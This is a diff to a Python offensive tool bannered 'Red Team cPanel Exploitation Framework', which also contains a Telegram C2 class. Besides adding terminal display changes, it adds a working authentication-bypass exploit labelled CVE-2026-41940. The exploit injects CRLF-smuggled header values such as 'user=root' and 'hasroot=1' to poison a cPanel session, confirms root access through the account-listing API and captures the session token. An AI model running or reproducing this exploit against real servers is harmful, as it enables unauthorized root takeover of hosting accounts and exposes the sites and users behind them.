@@ -11,6 +11,9 @@ import threading
 import logging
 import base64
 import random
+import shutil
+import atexit
+import signal
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from datetime import datetime
 from urllib.parse import urlparse
@@ -61,6 +64,85 @@ USER_AGENTS = [
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 logger = logging.getLogger(__name__)
 DEBUG = False
+
+TERMINAL_ROWS, TERMINAL_COLS = shutil.get_terminal_size(fallback=(80, 24))
+SCROLL_REGION_SET = False
+
+def set_scroll_region(top_row):
+    global SCROLL_REGION_SET
+    if top_row < TERMINAL_ROWS:
+        sys.stdout.write(f'\033[{top_row};{TERMINAL_ROWS}r')
+        sys.stdout.flush()
+        SCROLL_REGION_SET = True
+
+def reset_scroll_region():
+    global SCROLL_REGION_SET
+    if SCROLL_REGION_SET:
+        sys.stdout.write('\033[r')
+        sys.stdout.flush()
+        SCROLL_REGION_SET = False
+
+def clear_region():
+    sys.stdout.write('\033[J')
+    sys.stdout.flush()
+
+def move_to_region_start():
+    sys.stdout.write(f'\033[{SCROLL_TOP};0H')
+    sys.stdout.flush()
+
+def get_banner_lines():
+    RED = '\033[91m'
+    YELLOW = '\033[93m'
+    GREEN = '\033[92m'
+    RESET = '\033[0m'
+    lines = []
+    if HAS_PYFIGLET:
+        try:
+            banner_text = pyfiglet.figlet_format("cPanel-kill", font="slant")
+            for line in banner_text.split('\n'):
+                lines.append(RED + line + RESET)
+        except Exception:
+            lines = [
+                RED + "  _____  ____        _   _ _____ " + RESET,
+                RED + " |  __ \/ __ \      | \ | |_   _|" + RESET,
+                RED + " | |__) | |  | |_ __|  \| | | |  " + RESET,
+                RED + " |  ___/| |  | | '__| . ` | | |  " + RESET,
+                RED + " | |    | |__| | |  | |\  |_| |_ " + RESET,
+                RED + " |_|     \____/|_|  |_| \_|_____|" + RESET,
+            ]
+    else:
+        lines = [
+            RED + "  _____  ____        _   _ _____ " + RESET,
+            RED + " |  __ \/ __ \      | \ | |_   _|" + RESET,
+            RED + " | |__) | |  | |_ __|  \| | | |  " + RESET,
+            RED + " |  ___/| |  | | '__| . ` | | |  " + RESET,
+            RED + " | |    | |__| | |  | |\  |_| |_ " + RESET,
+            RED + " |_|     \____/|_|  |_| \_|_____|" + RESET,
+        ]
+    lines.append(YELLOW + "=" * 70 + RESET)
+    lines.append(GREEN + "  Red Team cPanel Exploitation Framework v3.0" + RESET)
+    lines.append(RED + "  FOR AUTHORIZED TESTING ONLY!" + RESET)
+    lines.append(RED + "  Unauthorized use is a FEDERAL CRIME." + RESET)
+    lines.append(YELLOW + "=" * 70 + RESET)
+    return lines
+
+def print_banner():
+    banner_lines = get_banner_lines()
+    sys.stdout.write('\033[2J\033[H')
+    for line in banner_lines:
+        print(line)
+    sys.stdout.flush()
+    return len(banner_lines)
+
+def initialize_terminal():
+    global SCROLL_TOP
+    banner_lines = print_banner()
+    SCROLL_TOP = banner_lines + 1
+    if SCROLL_TOP < TERMINAL_ROWS:
+        set_scroll_region(SCROLL_TOP)
+        move_to_region_start()
+    atexit.register(reset_scroll_region)
+    signal.signal(signal.SIGINT, lambda sig, frame: (reset_scroll_region(), sys.exit(0)))
 
 def get_session():
     if HAS_CURL_CFFI:
@@ -188,6 +270,122 @@ def get_cpanel_version(host, port):
             continue
     return None
 
+def exploit_cve_2026_41940(host, port):
+    scheme = "https" if port not in [2082, 2095] else "http"
+    base = f"{scheme}://{host}:{port}"
+    session = get_session()
+
+    version = get_cpanel_version(host, port)
+    if version:
+        try:
+            major = int(version.split('.')[0])
+            if major > 120:
+                return {"status": "CVE_Version_Patched", "token": None}
+        except:
+            pass
+
+    resp1 = request_with_retry("GET", f"{base}/cpanel/", session=session)
+    if not resp1 or resp1.status_code not in [200, 302]:
+        return {"status": "CVE_Stage1_Failed", "token": None}
+
+    cookie_name = None
+    for cookie in session.cookies:
+        if re.search(r'cpsess', cookie.name, re.I) or re.match(r'^[0-9a-f]{32}$', cookie.name):
+            cookie_name = cookie.name
+            break
+    if not cookie_name:
+        if "Set-Cookie" in resp1.headers:
+            set_cookie = resp1.headers["Set-Cookie"]
+            match = re.search(r'(cpsess[0-9a-f]+)=', set_cookie, re.I)
+            if match:
+                cookie_name = match.group(1)
+    if not cookie_name:
+        return {"status": "CVE_No_Cookie", "token": None}
+
+    poison_payloads = [
+        ("Authorization", f"Basic {base64.b64encode(b'root:somepass\r\nuser=root\r\nhasroot=1\r\ntfa_verified=1\r\nsuccessful_internal_auth_with_timestamp=9999999999').decode()}"),
+        ("User-Agent", f"root:somepass\r\nuser=root\r\nhasroot=1\r\ntfa_verified=1\r\nsuccessful_internal_auth_with_timestamp=9999999999"),
+        ("X-Forwarded-For", "127.0.0.1\r\nuser=root\r\nhasroot=1"),
+        ("Referer", f"{base}/\r\nuser=root\r\nhasroot=1")
+    ]
+
+    success = False
+    for header, value in poison_payloads:
+        headers = {header: value}
+        time.sleep(random.uniform(0.5, 2.0))
+        resp2 = request_with_retry("GET", f"{base}/cpanel/", session=session, headers=headers)
+        if resp2:
+            new_cookie = session.cookies.get(cookie_name)
+            if new_cookie and new_cookie != session.cookies.get(cookie_name):
+                success = True
+                break
+    if not success:
+        payload = (
+            "root:somepass\r\n"
+            "user=root\r\n"
+            "hasroot=1\r\n"
+            "tfa_verified=1\r\n"
+            "successful_internal_auth_with_timestamp=9999999999"
+        )
+        auth_b64 = base64.b64encode(payload.encode()).decode()
+        headers = {"Authorization": f"Basic {auth_b64}"}
+        resp2 = request_with_retry("GET", f"{base}/cpanel/", session=session, headers=headers)
+        if not resp2:
+            return {"status": "CVE_Stage2_Failed", "token": None}
+
+    reload_endpoints = [
+        f"{base}/json-api/version",
+        f"{base}/cpanel/",
+        f"{base}/json-api/listaccts"
+    ]
+    reload_success = False
+    for endpoint in reload_endpoints:
+        time.sleep(random.uniform(0.3, 1.0))
+        resp3 = request_with_retry("GET", endpoint, session=session)
+        if resp3 and resp3.status_code == 200:
+            reload_success = True
+            break
+    if not reload_success:
+        return {"status": "CVE_Stage3_Failed", "token": None}
+
+    token_value = session.cookies.get(cookie_name)
+    if not token_value:
+        return {"status": "CVE_Verify_Failed", "token": None}
+
+    verify_url = f"{base}/json-api/listaccts"
+    resp4 = request_with_retry("GET", verify_url, session=session)
+    if resp4 and resp4.status_code == 200:
+        try:
+            data = resp4.json()
+            if 'data' in data and 'acct' in data['data']:
+                ver = get_cpanel_version(host, port)
+                return {
+                    "status": "Exploited",
+                    "token": token_value,
+                    "cookie_name": cookie_name,
+                    "version": ver,
+                    "method": "CVE-2026-41940"
+                }
+        except:
+            pass
+
+    resp5 = request_with_retry("GET", f"{base}/json-api/version", session=session)
+    if resp5 and resp5.status_code == 200:
+        try:
+            data = resp5.json()
+            if 'version' in data:
+                return {
+                    "status": "Exploited",
+                    "token": token_value,
+                    "cookie_name": cookie_name,
+                    "version": data.get('version', {}).get('version'),
+                    "method": "CVE-2026-41940"
+                }
+        except:
+            pass
+
+    return {"status": "CVE_Verify_Failed", "token": None}
+
 def exploit_graphql(host, port):
     scheme = "https" if port not in [2082, 2095] else "http"
     base = f"{scheme}://{host}:{port}"
@@ -285,6 +483,7 @@ def validate_session(host, port, cookie_name, token):
 
 def exploit_cpanel(host, port):
     methods = [
+        ("CVE-2026-41940", exploit_cve_2026_41940),
         ("GraphQL", exploit_graphql),
         ("Legacy", exploit_legacy)
     ]
@@ -552,37 +751,6 @@ def export_results(results, filename="results.json"):
     logger.info(f"Results exported to {filename} and {txt_file}")
     return txt_file
 
-def print_banner():
-    RED = '\033[91m'
-    YELLOW = '\033[93m'
-    GREEN = '\033[92m'
-    RESET = '\033[0m'
-
-    if HAS_PYFIGLET:
-        try:
-            banner_text = pyfiglet.figlet_format("cPanel-kill", font="slant")
-            print(RED + banner_text + RESET)
-        except Exception:
-            print(RED + "  _____  ____        _   _ _____ " + RESET)
-            print(RED + " |  __ \/ __ \      | \ | |_   _|" + RESET)
-            print(RED + " | |__) | |  | |_ __|  \| | | |  " + RESET)
-            print(RED + " |  ___/| |  | | '__| . ` | | |  " + RESET)
-            print(RED + " | |    | |__| | |  | |\  |_| |_ " + RESET)
-            print(RED + " |_|     \____/|_|  |_| \_|_____|" + RESET)
-    else:
-        print(RED + "  _____  ____        _   _ _____ " + RESET)
-        print(RED + " |  __ \/ __ \      | \ | |_   _|" + RESET)
-        print(RED + " | |__) | |  | |_ __|  \| | | |  " + RESET)
-        print(RED + " |  ___/| |  | | '__| . ` | | |  " + RESET)
-        print(RED + " | |    | |__| | |  | |\  |_| |_ " + RESET)
-        print(RED + " |_|     \____/|_|  |_| \_|_____|" + RESET)
-
-    print(YELLOW + "=" * 70 + RESET)
-    print(GREEN + "  Red Team cPanel Exploitation Framework v3.0" + RESET)
-    print(RED + "  FOR AUTHORIZED TESTING ONLY!" + RESET)
-    print(RED + "  Unauthorized use is a FEDERAL CRIME." + RESET)
-    print(YELLOW + "=" * 70 + "\n" + RESET)
-
 class TelegramC2:
     def __init__(self, bot_token=None, chat_id=None):
         self.bot_token = bot_token or os.getenv("TELEGRAM_BOT_TOKEN")
@@ -641,11 +809,13 @@ class CPwn3rApp:
         self.debug = False
 
     def run(self):
-        print_banner()
+        initialize_terminal()
         self._main_menu()
 
     def _main_menu(self):
         while True:
+            clear_region()
+            move_to_region_start()
             print(Fore.CYAN + "\n" + "=" * 50)
             print(Fore.CYAN + "[ MAIN MENU ]")
             print("1. Load targets from file")
@@ -690,6 +860,7 @@ class CPwn3rApp:
             elif choice == '12':
                 print(Fore.CYAN + "[*] Goodbye.")
                 self.db.close()
+                reset_scroll_region()
                 sys.exit(0)
             else:
                 print(Fore.RED + "[-] Invalid option.")
@@ -933,8 +1104,10 @@ if __name__ == "__main__":
         app = CPwn3rApp()
         app.run()
     except KeyboardInterrupt:
+        reset_scroll_region()
         print(Fore.YELLOW + "\n[!] Interrupted by user.")
         sys.exit(0)
     except Exception as e:
+        reset_scroll_region()
         logger.critical(f"Unexpected error: {e}", exc_info=True)
         sys.exit(1)
